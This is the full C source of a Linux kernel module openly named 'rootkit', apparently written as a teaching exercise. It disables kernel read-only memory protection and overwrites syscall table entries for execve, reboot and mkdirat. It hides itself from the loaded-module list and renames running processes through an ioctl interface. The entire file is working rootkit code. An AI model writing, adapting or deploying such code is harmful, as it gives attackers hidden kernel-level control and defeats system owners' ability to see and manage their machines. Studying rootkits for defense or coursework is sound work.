#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>

#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <stdbool.h>

#include "rootkit.h"

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

/* for hide/unhide */
static struct list_head *prev_module;
static bool hidden;

/* for masquerade */
struct task_struct *p;
struct masq_proc_req req;
char buf[16];

/* for hook/unhook*/
static bool hooked;
static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
unsigned long *sys_call_table_;
#define __NR_execve 221
#define __NR_reboot 142
#define __NR_mkdirat 34
static asmlinkage long (*execve_ori)(const struct pt_regs *);
static asmlinkage long (*reboot_ori)(const struct pt_regs *);
static asmlinkage long (*mkdirat_ori)(const struct pt_regs *);
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
void (*update_mapping_prot)(phys_addr_t phys,
unsigned long virt, phys_addr_t size, pgprot_t prot);


static unsigned long lookup_symbols(const char *name)
{
	/*
	 * ref:
	 * https://github.com/LTD-Beget/tcpsecrets/blob/master/tcpsecrets.c
	 * get the symbols from kernel
	 */

	static kallsyms_lookup_name_t kallsyms_lookup_name;

	kallsyms_lookup_name = NULL;

	if (!kallsyms_lookup_name) {
		register_kprobe(&kp);
		kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
		unregister_kprobe(&kp);
	}
	return kallsyms_lookup_name(name);
}

static void write_protection_on(bool on)
{
	/*
	 * ref:
	 * https://javamana.com/2021/07/20210731105038539g.html
	 * modify the memory settings
	 * -> allow us to overwrite the system call table
	 */
	static unsigned long start_rodata, end_rodata, section_size;
	static bool visited;

	section_size = 0;
	visited = false;

	if (!visited) {
		update_mapping_prot =
			(void *)kallsyms_lookup_name("update_mapping_prot");
		start_rodata =
			(unsigned long)kallsyms_lookup_name("__start_rodata");
		end_rodata =
			(unsigned long)kallsyms_lookup_name("__end_rodata");
		section_size = end_rodata - start_rodata;
		visited = true;
	}

	if (on) {
		/* on == true => set the mermory to read-only */
		update_mapping_prot(__pa_symbol(start_rodata),
		start_rodata, section_size, PAGE_KERNEL_RO);
	} else {
		/* on == false => disable the write protection */
		update_mapping_prot(__pa_symbol(start_rodata),
		start_rodata, section_size, PAGE_KERNEL);
	}
}

asmlinkage long execve_hook(const struct pt_regs *regs)
{
	/*
	 * ref: https://xcellerator.github.io/posts/linux_rootkits_02/
	 */
	char __user *pathname_u = (char *)regs->regs[0];
	char pathname[NAME_MAX] = {0};

	strncpy_from_user(pathname, pathname_u, NAME_MAX);

	/* print out the pathname before calling system call */
	pr_info("exec %s\n", pathname);
	return execve_ori(regs);
}

asmlinkage long reboot_hook(const struct pt_regs *regs)
{
	return 0;
}

asmlinkage long mkdirat_hook(const struct pt_regs *regs)
{
	char __user *pathname = (char *)regs->regs[1];
	char dir_name[NAME_MAX] = {0};

	long ret = strncpy_from_user(dir_name, pathname, NAME_MAX);

	if (ret > 0)
		pr_info(
		"rootkit: trying to create directory with name: %s\n",
		dir_name);

	return -EEXIST;
}

static unsigned long rootkit_hook(void)
{
	if (!hooked) {
		sys_call_table_ =
			(unsigned long *)lookup_symbols("sys_call_table");
		preempt_disable();
		write_protection_on(false);

		/* Save the original system calls */
		execve_ori = (void *)sys_call_table_[__NR_execve];
		reboot_ori = (void *)sys_call_table_[__NR_reboot];
		mkdirat_ori  = (void *)sys_call_table_[__NR_mkdirat];

		/* Points to our system call */
		sys_call_table_[__NR_execve]  = (long)execve_hook;
		sys_call_table_[__NR_reboot]  = (long)reboot_hook;
		sys_call_table_[__NR_mkdirat] = (long)mkdirat_hook;

		write_protection_on(true);
		preempt_enable();
		hooked = true;
	} else
		pr_info("hook: System calls had been hooked.\n");
	return 0;
}

static unsigned long rootkit_unhook(void)
{
	if (hooked) {
		preempt_disable();
		write_protection_on(false);
		/* restore the real system call */
		sys_call_table_[__NR_execve]  = (unsigned long)execve_ori;
		sys_call_table_[__NR_reboot]  = (unsigned long)reboot_ori;
		sys_call_table_[__NR_mkdirat] = (unsigned long)mkdirat_ori;
		write_protection_on(true);
		preempt_enable();
		hooked = false;
	} else
		pr_info("unhook: System calls haven't been hooked.\n");
	return 0;
}

static void Hide(void)
{
	/* Save the previous module */
	prev_module = THIS_MODULE->list.prev;
	/* Hide the rootkit and set hidden = true */
	list_del(&THIS_MODULE->list);
	hidden = true;
}

static void Unhide(void)
{
	/* If already hidden, unhide it and set hidden = false */
	list_add(&THIS_MODULE->list, prev_module);
	hidden = false;
}

static long Masquerade(unsigned long arg)
{
	long ret = 0, i = 0;

	/* Copy masq_proc_req from user space */
	if (copy_from_user(&req,
		(struct masq_proc_req __user *)arg, sizeof(req))) {
		pr_info("Copy masq_proc_req failed.\n");
		ret = -EFAULT;
	} else {
		req.list = kmalloc_array(
			req.len, sizeof(struct masq_proc), GFP_KERNEL);
		/* Copy masq_proc list from user space */
		if (copy_from_user(req.list,
		((struct masq_proc_req __user *)arg)->list,
		sizeof(struct masq_proc) * req.len)) {
			pr_info("Copy masq_proc failed.\n");
			ret = -EFAULT;
		} else {
			/* Iterate through masq_proc */
			for (; i < req.len; i++) {
				/* Iterate through processes */
				for_each_process(p) {
					/* get process name */
					get_task_comm(buf, p);
					if (strcmp(buf,
					req.list[i].orig_name) == 0) {
						/* Simply copy the new name */
						strcpy(p->comm,
						req.list[i].new_name);
					}
				}
			}
		}
	}

	kfree(req.list);
	req.list = NULL;

	return ret;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
	unsigned long arg)
{
	long ret = 0;

	pr_info("%s\n", __func__);

	switch (ioctl) {

	/* HOOK System Call */
	case IOCTL_MOD_HOOK:
		ret = rootkit_hook();
		break;

	/* Hide/Unhide rootkit module in lsmod */
	case IOCTL_MOD_HIDE:
		if (hidden)
			Unhide();
		else
			Hide();
		break;

	/* Masquerade Process Name */
	case IOCTL_MOD_MASQ:
		ret = Masquerade(arg);
		break;

	default:
		ret = -EINVAL;
	}

	return ret;
}

static int rootkit_open(struct inode *inode, struct file *filp)
{

	pr_info("%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

const struct file_operations fops = {
open:rootkit_open,
unlocked_ioctl:rootkit_ioctl,
release:rootkit_release,
owner:THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	hidden = false;
	hooked = false;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall
	rootkit_unhook();
	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
